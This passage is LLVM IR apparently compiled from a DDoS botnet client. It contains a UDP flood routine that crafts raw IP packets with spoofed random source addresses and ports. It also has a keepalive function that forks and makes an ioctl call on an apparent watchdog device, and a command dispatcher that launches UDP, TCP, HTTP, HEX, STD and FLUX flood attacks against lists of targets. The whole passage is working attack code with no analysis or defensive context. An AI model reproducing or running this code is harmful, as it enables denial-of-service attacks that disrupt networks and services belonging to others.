; <label>:16:                                     ; preds = %8
  %17 = trunc i32 %1 to i16
  %18 = tail call zeroext i16 @htons(i16 zeroext %17) #17
  br label %19

; <label>:19:                                     ; preds = %16, %13
  %.sink = phi i16 [ %18, %16 ], [ %15, %13 ]
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 1
  store i16 %.sink, i16* %20, align 2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 2
  %22 = call i32 @getHost(i8* %0, %struct.in_addr* %21)
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %24, label %.loopexit

; <label>:24:                                     ; preds = %19
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 3, i64 0
  %26 = bitcast i8* %25 to i64*
  store i64 0, i64* %26, align 4
  %27 = icmp eq i32 %3, 32
  br i1 %27, label %28, label %59

; <label>:28:                                     ; preds = %24
  %29 = tail call i32 @socket(i32 2, i32 2, i32 17) #3
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %.loopexit, label %31

; <label>:31:                                     ; preds = %28
  %32 = add nsw i32 %4, 1
  %33 = sext i32 %32 to i64
  %34 = tail call noalias i8* @malloc(i64 %33) #3
  %35 = icmp eq i8* %34, null
  br i1 %35, label %.loopexit, label %36

; <label>:36:                                     ; preds = %31
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %34, i8 0, i64 %33, i32 1, i1 false)
  tail call void @RandString(i8* nonnull %34, i32 %4)
  %37 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %38 = add nsw i32 %37, %2
  %39 = sext i32 %4 to i64
  %40 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %41 = mul nsw i32 %7, 1000
  br label %.outer

.outer:                                           ; preds = %.outer.backedge, %36
  %.075.ph = phi i32 [ 0, %36 ], [ %.075.ph.be, %.outer.backedge ]
  %.074.ph = phi i32 [ 0, %36 ], [ %53, %.outer.backedge ]
  br label %42

; <label>:42:                                     ; preds = %.outer, %49
  %.074 = phi i32 [ 0, %49 ], [ %.074.ph, %.outer ]
  %43 = call i64 @sendto(i32 %29, i8* nonnull %34, i64 %39, i32 0, %struct.sockaddr* nonnull %40, i32 16) #3
  %44 = icmp eq i32 %.074, %5
  br i1 %44, label %45, label %52

; <label>:45:                                     ; preds = %42
  br i1 %12, label %46, label %49

; <label>:46:                                     ; preds = %45
  %47 = call i32 @rand_cmwc()
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %20, align 2
  br label %49

; <label>:49:                                     ; preds = %46, %45
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %51 = icmp sgt i32 %50, %38
  br i1 %51, label %.loopexit.loopexit, label %42

; <label>:52:                                     ; preds = %42
  %53 = add i32 %.074, 1
  %54 = icmp eq i32 %.075.ph, %6
  br i1 %54, label %55, label %57

; <label>:55:                                     ; preds = %52
  %56 = call i32 @usleep(i32 %41) #3
  br label %.outer.backedge

.outer.backedge:                                  ; preds = %55, %57
  %.075.ph.be = phi i32 [ %58, %57 ], [ 0, %55 ]
  br label %.outer

; <label>:57:                                     ; preds = %52
  %58 = add i32 %.075.ph, 1
  br label %.outer.backedge

; <label>:59:                                     ; preds = %24
  %60 = tail call i32 @socket(i32 2, i32 3, i32 17) #3
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %.loopexit, label %62

; <label>:62:                                     ; preds = %59
  store i32 1, i32* %10, align 4
  %63 = bitcast i32* %10 to i8*
  %64 = call i32 @setsockopt(i32 %60, i32 0, i32 3, i8* nonnull %63, i32 4) #3
  %65 = icmp slt i32 %64, 0
  br i1 %65, label %.loopexit, label %.preheader.preheader

.preheader.preheader:                             ; preds = %62
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.07681 = phi i32 [ %66, %.preheader ], [ 50, %.preheader.preheader ]
  %66 = add nsw i32 %.07681, -1
  %67 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %68 = call i32 @rand_cmwc()
  %69 = xor i32 %68, %67
  call void @srand(i32 %69) #3
  %70 = call i32 @rand() #3
  call void @init_rand(i32 %70)
  %71 = icmp eq i32 %66, 0
  br i1 %71, label %72, label %.preheader

; <label>:72:                                     ; preds = %.preheader
  %73 = icmp eq i32 %3, 0
  %74 = sub nsw i32 32, %3
  %75 = shl i32 -1, %74
  %.077 = select i1 %73, i32 0, i32 %75
  %76 = sext i32 %4 to i64
  %77 = add nsw i64 %76, 28
  %78 = call i8* @llvm.stacksave()
  %79 = alloca i8, i64 %77, align 16
  %80 = bitcast i8* %79 to %struct.iphdr*
  %81 = getelementptr i8, i8* %79, i64 20
  %82 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i64 0, i32 0
  %83 = load i32, i32* %82, align 4
  %84 = call i32 @GetRandomIP(i32 %.077)
  %85 = call i32 @htonl(i32 %84) #17
  %86 = add nsw i64 %76, 8
  %87 = trunc i64 %86 to i32
  call void @makeVSEPacket(%struct.iphdr* nonnull %80, i32 %83, i32 %85, i8 zeroext 17, i32 %87)
  %88 = trunc i64 %86 to i16
  %89 = call zeroext i16 @htons(i16 zeroext %88) #17
  %90 = getelementptr inbounds i8, i8* %79, i64 24
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 8
  %92 = call i32 @rand_cmwc()
  %93 = trunc i32 %92 to i16
  %94 = bitcast i8* %81 to i16*
  store i16 %93, i16* %94, align 4
  br i1 %12, label %95, label %97

; <label>:95:                                     ; preds = %72
  %96 = call i32 @rand_cmwc()
  br label %101

; <label>:97:                                     ; preds = %72
  %98 = trunc i32 %1 to i16
  %99 = call zeroext i16 @htons(i16 zeroext %98) #17
  %100 = zext i16 %99 to i32
  br label %101

; <label>:101:                                    ; preds = %97, %95
  %102 = phi i32 [ %96, %95 ], [ %100, %97 ]
  %103 = trunc i32 %102 to i16
  %104 = getelementptr inbounds i8, i8* %79, i64 22
  %105 = bitcast i8* %104 to i16*
  store i16 %103, i16* %105, align 2
  %106 = getelementptr inbounds i8, i8* %79, i64 26
  %107 = bitcast i8* %106 to i16*
  store i16 0, i16* %107, align 2
  %108 = load i16, i16* %91, align 8
  %109 = call zeroext i16 @checksum_tcp_udp(%struct.iphdr* nonnull %80, i8* %81, i16 zeroext %108, i32 12)
  store i16 %109, i16* %107, align 2
  %110 = getelementptr inbounds i8, i8* %79, i64 28
  call void @RandString(i8* %110, i32 %4)
  %111 = bitcast i8* %79 to i16*
  %112 = getelementptr inbounds i8, i8* %79, i64 2
  %113 = bitcast i8* %112 to i16*
  %114 = load i16, i16* %113, align 2
  %115 = zext i16 %114 to i32
  %116 = call zeroext i16 @csum(i16* nonnull %111, i32 %115)
  %117 = getelementptr inbounds i8, i8* %79, i64 10
  %118 = bitcast i8* %117 to i16*
  store i16 %116, i16* %118, align 2
  %119 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %120 = add nsw i32 %119, %2
  %121 = trunc i64 %77 to i32
  %122 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %123 = getelementptr inbounds i8, i8* %79, i64 4
  %124 = bitcast i8* %123 to i16*
  %125 = getelementptr inbounds i8, i8* %79, i64 12
  %126 = bitcast i8* %125 to i32*
  %127 = trunc i32 %1 to i16
  %128 = mul nsw i32 %7, 1000
  br label %.outer78

.outer78:                                         ; preds = %.outer78.backedge, %101
  %.073.ph = phi i32 [ 0, %101 ], [ %153, %.outer78.backedge ]
  %.0.ph = phi i32 [ 0, %101 ], [ %.0.ph.be, %.outer78.backedge ]
  br label %129

; <label>:129:                                    ; preds = %.outer78, %149
  %.073 = phi i32 [ 0, %149 ], [ %.073.ph, %.outer78 ]
  %130 = call i64 @sendto(i32 %60, i8* nonnull %79, i64 32, i32 %121, %struct.sockaddr* nonnull %122, i32 16) #3
  %131 = call i32 @rand_cmwc()
  %132 = trunc i32 %131 to i16
  store i16 %132, i16* %94, align 4
  br i1 %12, label %133, label %135

; <label>:133:                                    ; preds = %129
  %134 = call i32 @rand_cmwc()
  br label %138

; <label>:135:                                    ; preds = %129
  %136 = call zeroext i16 @htons(i16 zeroext %127) #17
  %137 = zext i16 %136 to i32
  br label %138

; <label>:138:                                    ; preds = %135, %133
  %139 = phi i32 [ %134, %133 ], [ %137, %135 ]
  %140 = trunc i32 %139 to i16
  store i16 %140, i16* %105, align 2
  %141 = call i32 @rand_cmwc()
  %142 = trunc i32 %141 to i16
  store i16 %142, i16* %124, align 4
  %143 = call i32 @GetRandomIP(i32 %.077)
  %144 = call i32 @htonl(i32 %143) #17
  store i32 %144, i32* %126, align 4
  %145 = load i16, i16* %113, align 2
  %146 = zext i16 %145 to i32
  %147 = call zeroext i16 @csum(i16* nonnull %111, i32 %146)
  store i16 %147, i16* %118, align 2
  %148 = icmp eq i32 %.073, %5
  br i1 %148, label %149, label %152

; <label>:149:                                    ; preds = %138
  %150 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %151 = icmp sgt i32 %150, %120
  br i1 %151, label %159, label %129

; <label>:152:                                    ; preds = %138
  %153 = add i32 %.073, 1
  %154 = icmp eq i32 %.0.ph, %6
  br i1 %154, label %155, label %157

; <label>:155:                                    ; preds = %152
  %156 = call i32 @usleep(i32 %128) #3
  br label %.outer78.backedge

.outer78.backedge:                                ; preds = %155, %157
  %.0.ph.be = phi i32 [ 0, %155 ], [ %158, %157 ]
  br label %.outer78

; <label>:157:                                    ; preds = %152
  %158 = add i32 %.0.ph, 1
  br label %.outer78.backedge

; <label>:159:                                    ; preds = %149
  call void @llvm.stackrestore(i8* %78)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %49
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %28, %59, %19, %62, %31, %159
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @ioctl_keepalive() local_unnamed_addr #1 {
  %1 = alloca i32, align 4
  %2 = tail call i32 @fork() #3
  store i32 %2, i32* @ioctl_pid, align 4
  %3 = icmp sgt i32 %2, 0
  %4 = icmp eq i32 %2, -1
  %or.cond = or i1 %3, %4
  br i1 %or.cond, label %5, label %6

; <label>:5:                                      ; preds = %0
  ret void

; <label>:6:                                      ; preds = %0
  store i32 1, i32* %1, align 4
  %7 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.98, i64 0, i64 0), i32 2) #3
  %8 = icmp eq i32 %7, -1
  br i1 %8, label %9, label %15

; <label>:9:                                      ; preds = %6
  %10 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.99, i64 0, i64 0), i32 2) #3
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %9
  %13 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.100, i64 0, i64 0), i32 2) #3
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %17, label %15

; <label>:15:                                     ; preds = %12, %9, %6
  %.04 = phi i32 [ %7, %6 ], [ %10, %9 ], [ %13, %12 ]
  %16 = call i32 (i32, i64, ...) @ioctl(i32 %.04, i64 2147768068, i32* nonnull %1) #3
  br label %17

; <label>:17:                                     ; preds = %15, %12
  call void @exit(i32 0) #16
  unreachable
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #5

declare i32 @sleep(i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.101, i64 0, i64 0)) #14
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %78

; <label>:6:                                      ; preds = %2
  %7 = icmp slt i32 %0, 6
  br i1 %7, label %.loopexit, label %8

; <label>:8:                                      ; preds = %6
  %9 = getelementptr inbounds i8*, i8** %1, i64 3
  %10 = load i8*, i8** %9, align 8
  %11 = tail call i32 @atoi(i8* %10) #14
  %12 = icmp eq i32 %11, -1
  br i1 %12, label %.loopexit, label %13

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds i8*, i8** %1, i64 2
  %15 = load i8*, i8** %14, align 8
  %16 = tail call i32 @atoi(i8* %15) #14
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %.loopexit, label %18

; <label>:18:                                     ; preds = %13
  %19 = getelementptr inbounds i8*, i8** %1, i64 4
  %20 = load i8*, i8** %19, align 8
  %21 = tail call i32 @atoi(i8* %20) #14
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %.loopexit, label %23

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds i8*, i8** %1, i64 5
  %25 = load i8*, i8** %24, align 8
  %26 = tail call i32 @atoi(i8* %25) #14
  %27 = icmp eq i32 %26, -1
  %28 = icmp sgt i32 %26, 65500
  %29 = or i1 %28, %27
  %30 = icmp sgt i32 %21, 32
  %or.cond202 = or i1 %30, %29
  br i1 %or.cond202, label %.loopexit, label %31

; <label>:31:                                     ; preds = %23
  %32 = icmp eq i32 %0, 7
  br i1 %32, label %33, label %38

; <label>:33:                                     ; preds = %31
  %34 = getelementptr inbounds i8*, i8** %1, i64 6
  %35 = load i8*, i8** %34, align 8
  %36 = tail call i32 @atoi(i8* %35) #14
  %37 = icmp slt i32 %36, 1
  br i1 %37, label %.loopexit, label %38

; <label>:38:                                     ; preds = %33, %31
  %39 = getelementptr inbounds i8*, i8** %1, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = load i8*, i8** %14, align 8
  %42 = tail call i32 @atoi(i8* %41) #14
  %43 = load i8*, i8** %9, align 8
  %44 = tail call i32 @atoi(i8* %43) #14
  %45 = load i8*, i8** %19, align 8
  %46 = tail call i32 @atoi(i8* %45) #14
  %47 = load i8*, i8** %24, align 8
  %48 = tail call i32 @atoi(i8* %47) #14
  %49 = icmp sgt i32 %0, 6
  br i1 %49, label %50, label %.thread212

; <label>:50:                                     ; preds = %38
  %51 = getelementptr inbounds i8*, i8** %1, i64 6
  %52 = load i8*, i8** %51, align 8
  %53 = tail call i32 @atoi(i8* %52) #14
  %54 = icmp eq i32 %0, 7
  br i1 %54, label %.thread212, label %55

; <label>:55:                                     ; preds = %50
  %56 = getelementptr inbounds i8*, i8** %1, i64 7
  %57 = load i8*, i8** %56, align 8
  %58 = tail call i32 @atoi(i8* %57) #14
  %59 = icmp sgt i32 %0, 8
  br i1 %59, label %60, label %.thread212

; <label>:60:                                     ; preds = %55
  %61 = getelementptr inbounds i8*, i8** %1, i64 8
  %62 = load i8*, i8** %61, align 8
  %63 = tail call i32 @atoi(i8* %62) #14
  br label %.thread212

.thread212:                                       ; preds = %50, %38, %55, %60
  %64 = phi i32 [ %58, %60 ], [ %58, %55 ], [ 1000000, %50 ], [ 1000000, %38 ]
  %65 = phi i32 [ %53, %60 ], [ %53, %55 ], [ %53, %50 ], [ 1000, %38 ]
  %66 = phi i32 [ %63, %60 ], [ 0, %55 ], [ 0, %50 ], [ 0, %38 ]
  %strchr = tail call i8* @strchr(i8* %40, i32 44)
  %67 = icmp eq i8* %strchr, null
  br i1 %67, label %74, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.thread212
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %70
  %.sink = phi i8* [ null, %70 ], [ %40, %.preheader.preheader ]
  %68 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i64 0, i64 0)) #3
  %69 = icmp eq i8* %68, null
  br i1 %69, label %.loopexit.loopexit, label %70

; <label>:70:                                     ; preds = %.preheader
  %71 = tail call i32 @listFork()
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %73, label %.preheader

; <label>:73:                                     ; preds = %70
  tail call void @sendUDP(i8* nonnull %68, i32 %42, i32 %44, i32 %46, i32 %48, i32 %65, i32 %64, i32 %66)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:74:                                     ; preds = %.thread212
  %75 = tail call i32 @listFork()
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %.loopexit

; <label>:77:                                     ; preds = %74
  tail call void @sendUDP(i8* %40, i32 %42, i32 %44, i32 %46, i32 %48, i32 %65, i32 %64, i32 %66)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:78:                                     ; preds = %2
  %79 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.102, i64 0, i64 0)) #14
  %80 = icmp eq i32 %79, 0
  br i1 %80, label %81, label %147

; <label>:81:                                     ; preds = %78
  %82 = icmp slt i32 %0, 6
  br i1 %82, label %.loopexit, label %83

; <label>:83:                                     ; preds = %81
  %84 = getelementptr inbounds i8*, i8** %1, i64 3
  %85 = load i8*, i8** %84, align 8
  %86 = tail call i32 @atoi(i8* %85) #14
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %.loopexit, label %88

; <label>:88:                                     ; preds = %83
  %89 = getelementptr inbounds i8*, i8** %1, i64 2
  %90 = load i8*, i8** %89, align 8
  %91 = tail call i32 @atoi(i8* %90) #14
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %.loopexit, label %93

; <label>:93:                                     ; preds = %88
  %94 = getelementptr inbounds i8*, i8** %1, i64 4
  %95 = load i8*, i8** %94, align 8
  %96 = tail call i32 @atoi(i8* %95) #14
  %97 = icmp eq i32 %96, -1
  %98 = icmp sgt i32 %96, 32
  %or.cond203 = or i1 %97, %98
  br i1 %or.cond203, label %.loopexit, label %99

; <label>:99:                                     ; preds = %93
  %100 = icmp sgt i32 %0, 6
  br i1 %100, label %101, label %.thread213

; <label>:101:                                    ; preds = %99
  %102 = getelementptr inbounds i8*, i8** %1, i64 6
  %103 = load i8*, i8** %102, align 8
  %104 = tail call i32 @atoi(i8* %103) #14
  %105 = icmp slt i32 %104, 0
  br i1 %105, label %.loopexit, label %106

; <label>:106:                                    ; preds = %101
  %107 = icmp eq i32 %0, 8
  br i1 %107, label %108, label %.thread213

; <label>:108:                                    ; preds = %106
  %109 = getelementptr inbounds i8*, i8** %1, i64 7
  %110 = load i8*, i8** %109, align 8
  %111 = tail call i32 @atoi(i8* %110) #14
  %112 = icmp slt i32 %111, 1
  br i1 %112, label %.loopexit, label %.thread213

.thread213:                                       ; preds = %99, %108, %106
  %113 = phi i1 [ true, %108 ], [ false, %106 ], [ false, %99 ]
  %114 = getelementptr inbounds i8*, i8** %1, i64 1
  %115 = load i8*, i8** %114, align 8
  %116 = load i8*, i8** %89, align 8
  %117 = tail call i32 @atoi(i8* %116) #14
  %118 = load i8*, i8** %84, align 8
  %119 = tail call i32 @atoi(i8* %118) #14
  %120 = load i8*, i8** %94, align 8
  %121 = tail call i32 @atoi(i8* %120) #14
  %122 = getelementptr inbounds i8*, i8** %1, i64 5
  %123 = load i8*, i8** %122, align 8
  br i1 %113, label %124, label %128

; <label>:124:                                    ; preds = %.thread213
  %125 = getelementptr inbounds i8*, i8** %1, i64 7
  %126 = load i8*, i8** %125, align 8
  %127 = tail call i32 @atoi(i8* %126) #14
  br label %128

; <label>:128:                                    ; preds = %.thread213, %124
  %129 = phi i32 [ %127, %124 ], [ 10, %.thread213 ]
  br i1 %100, label %130, label %134

; <label>:130:                                    ; preds = %128
  %131 = getelementptr inbounds i8*, i8** %1, i64 6
  %132 = load i8*, i8** %131, align 8
  %133 = tail call i32 @atoi(i8* %132) #14
  br label %134

; <label>:134:                                    ; preds = %128, %130
  %135 = phi i32 [ %133, %130 ], [ 0, %128 ]
  %strchr196 = tail call i8* @strchr(i8* %115, i32 44)
  %136 = icmp eq i8* %strchr196, null
  br i1 %136, label %143, label %.preheader218.preheader

.preheader218.preheader:                          ; preds = %134
  br label %.preheader218

.preheader218:                                    ; preds = %.preheader218.preheader, %139
  %.sink204 = phi i8* [ null, %139 ], [ %115, %.preheader218.preheader ]
  %137 = tail call i8* @strtok(i8* %.sink204, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i64 0, i64 0)) #3
  %138 = icmp eq i8* %137, null
  br i1 %138, label %.loopexit.loopexit260, label %139

; <label>:139:                                    ; preds = %.preheader218
  %140 = tail call i32 @listFork()
  %141 = icmp eq i32 %140, 0
  br i1 %141, label %142, label %.preheader218

; <label>:142:                                    ; preds = %139
  tail call void @sendTCP(i8* nonnull %137, i32 %117, i32 %119, i32 %121, i8* %123, i32 %135, i32 %129)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:143:                                    ; preds = %134
  %144 = tail call i32 @listFork()
  %145 = icmp eq i32 %144, 0
  br i1 %145, label %146, label %.loopexit

; <label>:146:                                    ; preds = %143
  tail call void @sendTCP(i8* %115, i32 %117, i32 %119, i32 %121, i8* %123, i32 %135, i32 %129)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:147:                                    ; preds = %78
  %148 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.103, i64 0, i64 0)) #14
  %149 = icmp eq i32 %148, 0
  br i1 %149, label %150, label %172

; <label>:150:                                    ; preds = %147
  %151 = icmp slt i32 %0, 4
  br i1 %151, label %.loopexit, label %152

; <label>:152:                                    ; preds = %150
  %153 = getelementptr inbounds i8*, i8** %1, i64 2
  %154 = load i8*, i8** %153, align 8
  %155 = tail call i32 @atoi(i8* %154) #14
  %156 = icmp slt i32 %155, 1
  br i1 %156, label %.loopexit, label %157

; <label>:157:                                    ; preds = %152
  %158 = getelementptr inbounds i8*, i8** %1, i64 3
  %159 = load i8*, i8** %158, align 8
  %160 = tail call i32 @atoi(i8* %159) #14
  %161 = icmp slt i32 %160, 1
  br i1 %161, label %.loopexit, label %162

; <label>:162:                                    ; preds = %157
  %163 = getelementptr inbounds i8*, i8** %1, i64 1
  %164 = load i8*, i8** %163, align 8
  %strchr197 = tail call i8* @strchr(i8* %164, i32 44)
  %165 = icmp eq i8* %strchr197, null
  br i1 %165, label %171, label %.preheader220

.preheader220:                                    ; preds = %162
  %166 = tail call i8* @strtok(i8* %164, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i64 0, i64 0)) #3
  %167 = icmp eq i8* %166, null
  br i1 %167, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader220
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %168 = phi i8* [ %169, %.lr.ph ], [ %166, %.lr.ph.preheader ]
  tail call void @sendHTTP(i8* nonnull %168, i32 %155, i32 %160)
  %169 = tail call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i64 0, i64 0)) #3
  %170 = icmp eq i8* %169, null
  br i1 %170, label %.loopexit.loopexit261, label %.lr.ph

; <label>:171:                                    ; preds = %162
  tail call void @sendHTTP(i8* %164, i32 %155, i32 %160)
  br label %.loopexit

; <label>:172:                                    ; preds = %147
  %173 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.104, i64 0, i64 0)) #14
  %174 = icmp eq i32 %173, 0
  br i1 %174, label %175, label %203

; <label>:175:                                    ; preds = %172
  %176 = icmp slt i32 %0, 6
  br i1 %176, label %.loopexit, label %177

; <label>:177:                                    ; preds = %175
  %178 = getelementptr inbounds i8*, i8** %1, i64 3
  %179 = load i8*, i8** %178, align 8
  %180 = tail call i32 @atoi(i8* %179) #14
  %181 = icmp slt i32 %180, 1
  br i1 %181, label %.loopexit, label %182

; <label>:182:                                    ; preds = %177
  %183 = getelementptr inbounds i8*, i8** %1, i64 5
  %184 = load i8*, i8** %183, align 8
  %185 = tail call i32 @atoi(i8* %184) #14
  %186 = icmp slt i32 %185, 1
  br i1 %186, label %.loopexit, label %187

; <label>:187:                                    ; preds = %182
  %188 = tail call i32 @listFork()
  %189 = icmp eq i32 %188, 0
  br i1 %189, label %190, label %.loopexit

; <label>:190:                                    ; preds = %187
  %191 = getelementptr inbounds i8*, i8** %1, i64 1
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr inbounds i8*, i8** %1, i64 2
  %194 = load i8*, i8** %193, align 8
  %195 = load i8*, i8** %178, align 8
  %196 = tail call i32 @atoi(i8* %195) #14
  %197 = trunc i32 %196 to i16
  %198 = load i8*, i8** %183, align 8
  %199 = tail call i32 @atoi(i8* %198) #14
  %200 = getelementptr inbounds i8*, i8** %1, i64 6
  %201 = load i8*, i8** %200, align 8
  %202 = tail call i32 @atoi(i8* %201) #14
  tail call void @sendHEX(i8* %192, i8* %194, i16 zeroext %197, i8* undef, i32 %199, i32 %202)
  tail call void @exit(i32 0) #16
  unreachable

; <label>:203:                                    ; preds = %172
  %204 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i64 0, i64 0)) #14
  %205 = icmp eq i32 %204, 0
  br i1 %205, label %206, label %227

; <label>:206:                                    ; preds = %203
  %207 = icmp slt i32 %0, 4
  br i1 %207, label %.loopexit, label %208

; <label>:208:                                    ; preds = %206
  %209 = getelementptr inbounds i8*, i8** %1, i64 2
  %210 = load i8*, i8** %209, align 8
  %211 = tail call i32 @atoi(i8* %210) #14
  %212 = icmp slt i32 %211, 1
  br i1 %212, label %.loopexit, label %213

; <label>:213:                                    ; preds = %208
  %214 = getelementptr inbounds i8*, i8** %1, i64 3
  %215 = load i8*, i8** %214, align 8
  %216 = tail call i32 @atoi(i8* %215) #14
  %217 = icmp slt i32 %216, 1
  br i1 %217, label %.loopexit, label %218

; <label>:218:                                    ; preds = %213
  %219 = getelementptr inbounds i8*, i8** %1, i64 1
  %220 = load i8*, i8** %219, align 8
  %strchr198 = tail call i8* @strchr(i8* %220, i32 44)
  %221 = icmp eq i8* %strchr198, null
  br i1 %221, label %226, label %222

; <label>:222:                                    ; preds = %218
  %223 = tail call i8* @strtok(i8* %220, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i64 0, i64 0)) #3
  %224 = icmp eq i8* %223, null
  br i1 %224, label %.loopexit, label %225

; <label>:225:                                    ; preds = %222
  tail call void @sendSTD(i8* nonnull %223, i32 %211, i32 %216)
  unreachable

; <label>:226:                                    ; preds = %218
  tail call void @sendSTD(i8* %220, i32 %211, i32 %216)
  unreachable

; <label>:227:                                    ; preds = %203
  %228 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.106, i64 0, i64 0)) #14
  %229 = icmp eq i32 %228, 0
  br i1 %229, label %230, label %.loopexit227

; <label>:230:                                    ; preds = %227
  %231 = icmp slt i32 %0, 6
  br i1 %231, label %.loopexit, label %232

; <label>:232:                                    ; preds = %230
  %233 = getelementptr inbounds i8*, i8** %1, i64 1
  %234 = load i8*, i8** %233, align 8
  %235 = getelementptr inbounds i8*, i8** %1, i64 2
  %236 = load i8*, i8** %235, align 8
  %237 = tail call i32 @atoi(i8* %236) #14
  %238 = getelementptr inbounds i8*, i8** %1, i64 3
  %239 = load i8*, i8** %238, align 8
  %240 = tail call i32 @atoi(i8* %239) #14
  %241 = getelementptr inbounds i8*, i8** %1, i64 4
  %242 = load i8*, i8** %241, align 8
  %243 = tail call i32 @atoi(i8* %242) #14
  %244 = icmp eq i32 %0, 7
  br i1 %244, label %245, label %249

; <label>:245:                                    ; preds = %232
  %246 = getelementptr inbounds i8*, i8** %1, i64 6
  %247 = load i8*, i8** %246, align 8
  %248 = tail call i32 @atoi(i8* %247) #14
  br label %249

; <label>:249:                                    ; preds = %232, %245
  %250 = phi i32 [ %248, %245 ], [ 10, %232 ]
  %251 = getelementptr inbounds i8*, i8** %1, i64 5
  %252 = load i8*, i8** %251, align 8
  %253 = tail call i32 @atoi(i8* %252) #14
  %strchr199 = tail call i8* @strchr(i8* %234, i32 44)
  %254 = icmp eq i8* %strchr199, null
  br i1 %254, label %261, label %.preheader226.preheader

.preheader226.preheader:                          ; preds = %249
  br label %.preheader226

.preheader226:                                    ; preds = %.preheader226.preheader, %257
  %.sink207 = phi i8* [ null, %257 ], [ %234, %.preheader226.preheader ]
  %255 = tail call i8* @strtok(i8* %.sink207, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i64 0, i64 0)) #3
  %256 = icmp eq i8* %255, null
  br i1 %256, label %.loopexit227.loopexit, label %257

; <label>:257:                                    ; preds = %.preheader226
  %258 = tail call i32 @listFork()
  %259 = icmp eq i32 %258, 0
  br i1 %259, label %260, label %.preheader226

; <label>:260:                                    ; preds = %257
  tail call void @sendFLUX(i8* nonnull %255, i32 %237, i32 %240, i32 %243, i32 %253, i32 %250)
  tail call void @_exit(i32 0) #16
  unreachable

; <label>:261:                                    ; preds = %249
  %262 = tail call i32 @listFork()
  %263 = icmp eq i32 %262, 0
  br i1 %263, label %264, label %.loopexit

; <label>:264:                                    ; preds = %261
  tail call void @sendFLUX(i8* %234, i32 %237, i32 %240, i32 %243, i32 %253, i32 %250)
  tail call void @_exit(i32 0) #16
  unreachable

.loopexit227.loopexit:                            ; preds = %.preheader226
  br label %.loopexit227

.loopexit227:                                     ; preds = %.loopexit227.loopexit, %227
  %265 = load i8*, i8** %1, align 8
  %266 = tail call i32 @strcmp(i8* %265, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.107, i64 0, i64 0)) #14
